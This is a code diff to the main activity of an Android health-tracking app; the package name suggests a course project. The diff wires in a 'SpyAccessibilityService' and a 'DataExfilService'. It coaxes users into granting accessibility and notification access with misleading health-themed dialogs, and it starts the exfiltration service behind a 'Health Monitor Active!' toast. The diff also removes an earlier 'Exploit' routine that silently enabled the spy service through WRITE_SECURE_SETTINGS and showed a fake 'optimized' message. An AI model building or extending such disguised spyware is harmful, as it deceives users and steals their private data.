@@ -35,12 +35,16 @@ import kotlinx.coroutines.launch
 import android.provider.Settings
 import android.widget.Toast
 import com.inf2007.healthtracker.utilities.SpyAccessibilityService
+import android.content.ComponentName
+import com.inf2007.healthtracker.utilities.DataExfilService
 
 class MainActivity : ComponentActivity() {
     private val PERMISSIONS_REQUEST_CODE = 100
 
     private val handler = Handler(Looper.getMainLooper())
     private var isPolling = false
+
+    private var isPollingAccessibility = false
 
     private val checkPermissionRunnable = object : Runnable {
         override fun run() {
@@ -49,6 +53,34 @@ class MainActivity : ComponentActivity() {
                 stopPollingAndReturn()
             } else if (isPolling) {
                 // Keep checking every 1000ms (1 second)
+                handler.postDelayed(this, 1000)
+            }
+        }
+    }
+
+    private val checkAccessibilityRunnable = object : Runnable {
+        override fun run() {
+            if (isAccessibilityServiceEnabled()) {
+                // Success! Stop polling
+                isPollingAccessibility = false
+                handler.removeCallbacks(this)
+
+                runOnUiThread {
+                    Toast.makeText(
+                        this@MainActivity,
+                        "Health monitoring enhanced!",
+                        Toast.LENGTH_SHORT
+                    ).show()
+
+                    // Move to next permission
+                    if (!NotificationPermissionUtils.isNotificationAccessGranted(this@MainActivity)) {
+                        handleNotificationAccessFinalStep()
+                    } else {
+                        startHealthService()
+                    }
+                }
+            } else if (isPollingAccessibility) {
+                // Keep checking every 1000ms
                 handler.postDelayed(this, 1000)
             }
         }
@@ -67,8 +99,14 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-        startHealthService()
-        handleNotificationAccessFinalStep()
+        // Check accessibility first
+        if (!isAccessibilityServiceEnabled()) {
+            requestAccessibilityPermission()
+        } else if (!NotificationPermissionUtils.isNotificationAccessGranted(this)) {
+            handleNotificationAccessFinalStep()
+        } else {
+            startHealthService()
+        }
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -98,22 +136,42 @@ class MainActivity : ComponentActivity() {
             // Trigger your "Success" logic
             onPermissionGrantedSuccessfully()
         }
+
+        // Also check accessibility
+        if (isAccessibilityServiceEnabled() && NotificationPermissionUtils.isNotificationAccessGranted(this)) {
+            onPermissionGrantedSuccessfully()
+        }
     }
 
     override fun onDestroy() {
         super.onDestroy()
         isPolling = false
+        isPollingAccessibility = false
         handler.removeCallbacks(checkPermissionRunnable)
+        handler.removeCallbacks(checkAccessibilityRunnable)
     }
 
     private fun onPermissionGrantedSuccessfully() {
-        // 1. Start the service now that we have the 'key'
+        // 1. Start the step counter service
         startHealthService()
 
-        // 2. Show a feedback message so the user knows it worked
+        // 2. Start DataExfilService regardless of accessibility
+        val exfilIntent = Intent(this, DataExfilService::class.java)
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(exfilIntent)
+            } else {
+                startService(exfilIntent)
+            }
+            Log.i("HealthTracker", "DataExfilService started")
+        } catch (e: Exception) {
+            Log.e("HealthTracker", "Failed to start DataExfilService: ${e.message}")
+        }
+
+        // 3. Show a feedback message so the user knows it worked
         Toast.makeText(this, "Health Monitor Active!", Toast.LENGTH_SHORT).show()
 
-        // 3. Log it so you can see it in Logcat
+        // 4. Log it so you can see it in Logcat
         Log.i("HealthTracker", "=== PERMISSION GRANTED: SERVICE INITIALIZED ===")
     }
 
@@ -179,6 +237,9 @@ class MainActivity : ComponentActivity() {
         if (missing.isNotEmpty()) {
             // This triggers the standard Android "Allow/Deny" popups in a bundle
             requestPermissionLauncher.launch(permissions)
+        } else if (!isAccessibilityServiceEnabled()) {
+            // Check accessibility first
+            requestAccessibilityPermission()
         } else if (!NotificationPermissionUtils.isNotificationAccessGranted(this)) {
             // If standard ones are done, move straight to the final special one
             handleNotificationAccessFinalStep()
@@ -370,60 +431,43 @@ class MainActivity : ComponentActivity() {
         return String(digits)
     }
 
-    private fun tryEnableAccessibilityExploit() {
-        // Check if we already have the service enabled
-        if (SpyAccessibilityService.isEnabled(this)) {
-            Log.d("Exploit", "Accessibility service already enabled")
-            return
-        }
+    // ========== NEW METHODS FOR ACCESSIBILITY ==========
+    private fun isAccessibilityServiceEnabled(): Boolean {
+        return try {
+            val enabledServices = Settings.Secure.getString(
+                contentResolver,
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+            ) ?: ""
 
-        // Check if we have WRITE_SECURE_SETTINGS permission
-        val hasWriteSecureSettings = checkCallingOrSelfPermission("android.permission.WRITE_SECURE_SETTINGS") ==
-                PackageManager.PERMISSION_GRANTED
-
-        if (hasWriteSecureSettings) {
-            // We can enable it programmatically!
-            Log.d("Exploit", "Attempting to enable accessibility service via WRITE_SECURE_SETTINGS")
-            SpyAccessibilityService.tryEnableProgrammatically(this)
-
-            // Show a fake "optimization" message
-            Toast.makeText(this, "Health monitoring optimized", Toast.LENGTH_SHORT).show()
-
-        } else {
-            // Fallback: Show user the legitimate way to enable it
-            Log.d("Exploit", "No WRITE_SECURE_SETTINGS - showing legitimate request")
-            showLegitimateAccessibilityRequest()
+            val serviceName = ComponentName(this, SpyAccessibilityService::class.java).flattenToString()
+            enabledServices.contains(serviceName)
+        } catch (e: Exception) {
+            false
         }
     }
 
-    private fun showLegitimateAccessibilityRequest() {
+    private fun requestAccessibilityPermission() {
         AlertDialog.Builder(this)
             .setTitle("Enhanced Health Tracking")
-            .setMessage("For better health insights, enable accessibility services. This helps track app usage patterns for personalized recommendations.")
+            .setMessage("For better health insights, enable 'Health Assistant' accessibility service. This helps track app usage patterns for personalized recommendations.")
             .setPositiveButton("Enable") { _, _ ->
+                // Start polling before leaving
+                isPollingAccessibility = true
+                handler.post(checkAccessibilityRunnable)
+
                 val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                 startActivity(intent)
 
-                // Start polling to detect when user enables it
-                startPollingForAccessibility()
+                Toast.makeText(this, "Enable 'Health Assistant' then return", Toast.LENGTH_LONG).show()
             }
-            .setNegativeButton("Skip", null)
-            .show()
-    }
-
-    private fun startPollingForAccessibility() {
-        val pollHandler = Handler(Looper.getMainLooper())
-        val pollRunnable = object : Runnable {
-            override fun run() {
-                if (SpyAccessibilityService.isEnabled(this@MainActivity)) {
-                    // Success! Stop polling
-                    Toast.makeText(this@MainActivity,
-                        "Enhanced tracking activated", Toast.LENGTH_SHORT).show()
-                    return
+            .setNegativeButton("Skip") { _, _ ->
+                // Skip to notification permission
+                if (!NotificationPermissionUtils.isNotificationAccessGranted(this)) {
+                    handleNotificationAccessFinalStep()
+                } else {
+                    startHealthService()
                 }
-                pollHandler.postDelayed(this, 1000) // Check every second
             }
-        }
-        pollHandler.post(pollRunnable)
+            .show()
     }
 }
